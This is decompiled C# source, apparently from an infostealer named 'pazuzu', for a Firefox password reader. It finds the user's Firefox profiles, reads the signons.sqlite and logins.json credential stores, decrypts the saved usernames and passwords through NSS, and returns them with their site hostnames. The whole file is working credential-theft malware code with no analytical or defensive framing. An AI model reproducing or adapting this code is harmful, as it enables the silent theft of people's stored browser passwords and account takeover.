using System;
using System.Collections.Generic;
using System.Data.Common;
using System.Data.SQLite;
using System.IO;
using Newtonsoft.Json;

namespace pazuzu;

internal class FirefoxPassReader : IPassReader
{
	private class FFLogins
	{
		public long nextId { get; set; }

		public LoginData[] logins { get; set; }

		public string[] disabledHosts { get; set; }

		public int version { get; set; }
	}

	private class LoginData
	{
		public long id { get; set; }

		public string hostname { get; set; }

		public string url { get; set; }

		public string httprealm { get; set; }

		public string formSubmitURL { get; set; }

		public string usernameField { get; set; }

		public string passwordField { get; set; }

		public string encryptedUsername { get; set; }

		public string encryptedPassword { get; set; }

		public string guid { get; set; }

		public int encType { get; set; }

		public long timeCreated { get; set; }

		public long timeLastUsed { get; set; }

		public long timePasswordChanged { get; set; }

		public long timesUsed { get; set; }
	}

	public string BrowserName => "Firefox";

	public IEnumerable<CredentialModel> ReadPasswords()
	{
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		string text = null;
		string path = null;
		bool flag = false;
		bool flag2 = false;
		string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
		List<CredentialModel> list = new List<CredentialModel>();
		if (directories.Length == 0)
		{
			return list;
		}
		string[] array = directories;
		foreach (string text2 in array)
		{
			string[] files = Directory.GetFiles(text2, "signons.sqlite");
			if (files.Length != 0)
			{
				text = files[0];
				flag = true;
			}
			files = Directory.GetFiles(text2, "logins.json");
			if (files.Length != 0)
			{
				path = files[0];
				flag2 = true;
			}
			if (flag2 || flag)
			{
				FFDecryptor.NSS_Init(text2);
				break;
			}
		}
		if (flag)
		{
			SQLiteConnection val = new SQLiteConnection("Data Source=" + text + ";");
			try
			{
				((DbConnection)(object)val).Open();
				SQLiteCommand val2 = val.CreateCommand();
				try
				{
					((DbCommand)(object)val2).CommandText = "SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins";
					SQLiteDataReader val3 = val2.ExecuteReader();
					try
					{
						while (((DbDataReader)(object)val3).Read())
						{
							string username = FFDecryptor.Decrypt(((DbDataReader)(object)val3).GetString(0));
							string password = FFDecryptor.Decrypt(((DbDataReader)(object)val3).GetString(1));
							list.Add(new CredentialModel
							{
								Username = username,
								Password = password,
								Url = ((DbDataReader)(object)val3).GetString(2)
							});
						}
					}
					finally
					{
						((IDisposable)val3)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
				((DbConnection)(object)val).Close();
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		if (flag2)
		{
			FFLogins fFLogins;
			using (StreamReader streamReader = new StreamReader(path))
			{
				string text3 = streamReader.ReadToEnd();
				fFLogins = JsonConvert.DeserializeObject<FFLogins>(text3);
			}
			LoginData[] logins = fFLogins.logins;
			foreach (LoginData loginData in logins)
			{
				string username2 = FFDecryptor.Decrypt(loginData.encryptedUsername);
				string password2 = FFDecryptor.Decrypt(loginData.encryptedPassword);
				list.Add(new CredentialModel
				{
					Username = username2,
					Password = password2,
					Url = loginData.hostname
				});
			}
		}
		return list;
	}
}
